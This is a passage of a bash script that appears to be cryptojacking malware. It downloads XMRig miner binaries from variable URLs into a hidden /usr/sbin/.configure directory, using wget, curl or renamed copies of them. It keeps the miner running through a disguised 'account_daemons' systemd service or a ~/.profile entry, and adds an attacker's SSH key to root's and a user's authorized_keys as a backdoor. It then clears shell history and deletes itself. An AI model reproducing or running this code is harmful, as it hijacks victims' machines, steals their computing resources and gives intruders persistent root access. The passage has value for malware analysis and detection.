	elif type curl 2>/dev/null 1>/dev/null; then curl -s $XMR_1_BIN_URL -o /usr/sbin/.configure/xmrig.tar.gz
	elif type cd1 2>/dev/null 1>/dev/null; then cd1 -s $XMR_1_BIN_URL -o /usr/sbin/.configure/xmrig.tar.gz
	elif type cdl 2>/dev/null 1>/dev/null; then cdl -s $XMR_1_BIN_URL -o /usr/sbin/.configure/xmrig.tar.gz
elif type bash 2>/dev/null 1>/dev/null; then C_hg_DLOAD $XMR_1_BIN_URL > /usr/sbin/.configure/xmrig.tar.gz
fi

tar -xvf /usr/sbin/.configure/xmrig.tar.gz -C /usr/sbin/.configure/ 2>/dev/null
rm -f /usr/sbin/.configure/xmrig.tar.gz 2>/dev/null 1>/dev/null

chmod +x /usr/sbin/.configure/xmrig
if [ -f "/usr/sbin/.configure/xmrigMiner" ];then chmod +x /usr/sbin/.configure/xmrigMiner; fi

/usr/sbin/.configure/xmrig -h 2>/dev/null 1>/dev/null
CHECK_XMRIG=$?
if [[ "$CHECK_XMRIG" != "0" ]]; then
if [ -f /usr/sbin/.configure/xmrig ]
then echo "WARNING: /usr/sbin/.configure/xmrig is not functional"
if [ -f "/usr/sbin/.configure/xmrig" ];then rm -f /usr/sbin/.configure/xmrig; fi
if [ -f "/usr/sbin/.configure/xmrigMiner" ];then rm -f /usr/sbin/.configure/xmrigMiner; fi
else 
echo "WARNING: /usr/sbin/.configure/xmrig was removed"
if [ -f "/usr/sbin/.configure/xmrigMiner" ];then rm -f /usr/sbin/.configure/xmrigMiner; fi
fi
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

echo "[*] Downloading xmrigCC to /usr/sbin/.configure/xmrig.tar.gz"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' /usr/sbin/.configure/config.json
if type wget 2>/dev/null 1>/dev/null; then wget -q $XMR_2_BIN_URL -O /usr/sbin/.configure/xmrig.tar.gz
elif type wd1 2>/dev/null 1>/dev/null; then wd1 -q $XMR_2_BIN_URL -O /usr/sbin/.configure/xmrig.tar.gz
elif type wdl 2>/dev/null 1>/dev/null; then wdl -q $XMR_2_BIN_URL -O /usr/sbin/.configure/xmrig.tar.gz
	elif type curl 2>/dev/null 1>/dev/null; then curl -s $XMR_2_BIN_URL -o /usr/sbin/.configure/xmrig.tar.gz
	elif type cd1 2>/dev/null 1>/dev/null; then cd1 -s $XMR_2_BIN_URL -o /usr/sbin/.configure/xmrig.tar.gz
	elif type cdl 2>/dev/null 1>/dev/null; then cdl -s $XMR_2_BIN_URL -o /usr/sbin/.configure/xmrig.tar.gz
elif type bash 2>/dev/null 1>/dev/null; then C_hg_DLOAD $XMR_2_BIN_URL > /usr/sbin/.configure/xmrig.tar.gz
fi

tar -xvf /usr/sbin/.configure/xmrig.tar.gz -C /usr/sbin/.configure/ 2>/dev/null
rm -f /usr/sbin/.configure/xmrig.tar.gz 2>/dev/null 1>/dev/null

chmod +x /usr/sbin/.configure/xmrig
if [ -f "/usr/sbin/.configure/xmrigMiner" ];then chmod +x /usr/sbin/.configure/xmrigMiner; fi

/usr/sbin/.configure/xmrig -h 2>/dev/null 1>/dev/null
CHECK_XMRIG=$?
if [[ "$CHECK_XMRIG" != "0" ]]; then
if [ -f /usr/sbin/.configure/xmrig ]
then echo "WARNING: /usr/sbin/.configure/xmrig is not functional"
if [ -f "/usr/sbin/.configure/xmrig" ];then rm -f /usr/sbin/.configure/xmrig; fi
if [ -f "/usr/sbin/.configure/xmrigMiner" ];then rm -f /usr/sbin/.configure/xmrigMiner; fi
else 
echo "WARNING: /usr/sbin/.configure/xmrig was removed"
if [ -f "/usr/sbin/.configure/xmrigMiner" ];then rm -f /usr/sbin/.configure/xmrigMiner; fi
fi

rm -f k32r.sh 2>/dev/null
exit

fi
fi

echo "[*] Miner /usr/sbin/.configure/xmrig is OK"

}

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $PORT ]; then PORT="10128"; fi
if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then PORT="10128"; fi


echo "";echo "[*] $CPU_THREADS CPU threads";echo "[*] Hashrate $EXP_MONERO_HASHRATE KH/s.";echo "";sleep 2


CREATE_JSON_CONFIG
DOWNLOAD_FILE


echo "[*] Creating /usr/sbin/.configure/config.sh script"
cat >/usr/sbin/.configure/config.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice /usr/sbin/.configure/xmrig \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x /usr/sbin/.configure/config.sh

if ! sudo -n true 2>/dev/null; then
  if ! grep /usr/sbin/.configure/config.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding /usr/sbin/.configure/config.sh script to $HOME/.profile"
    echo "/usr/sbin/.configure/config.sh -c /usr/sbin/.configure/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like /usr/sbin/.configure/config.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in /usr/sbin/.configure/xmrig.log file)"
  /bin/bash /usr/sbin/.configure/config.sh -c /usr/sbin/.configure/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in /usr/sbin/.configure/xmrig.log file)"
    /bin/bash /usr/sbin/.configure/config.sh -c /usr/sbin/.configure/config_background.json >/dev/null 2>&1


  else

    echo "[*] Creating account_daemons systemd service"
    cat >/etc/systemd/system/account_daemons.service <<EOL
[Unit]
Description=account daemons service

[Service]
ExecStart=/usr/sbin/.configure/xmrig -c /usr/sbin/.configure/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL

echo "[*] Starting account_daemons systemd service"
killall xmrig 2>/dev/null
systemctl daemon-reload
systemctl enable account_daemons.service
systemctl start account_daemons.service
  fi
fi

mkdir -p /root/.ssh/ 2>/dev/null 1>/dev/null
echo $ID_RSA_KEY >> /root/.ssh/authorized_keys2
cat /root/.ssh/authorized_keys2 >> /root/.ssh/authorized_keys
mkdir -p /home/hilde/.ssh/ 2>/dev/null 1>/dev/null
cat /root/.ssh/authorized_keys2 >> /home/hilde/.ssh/authorized_keys
cat /home/hilde/.ssh/authorized_keys > /home/hilde/.ssh/authorized_keys2

history -c 2>/dev/null 1>/dev/null
echo "[*] Setup complete"
rm -f k32r.sh 2>/dev/null
sleep 3
clear



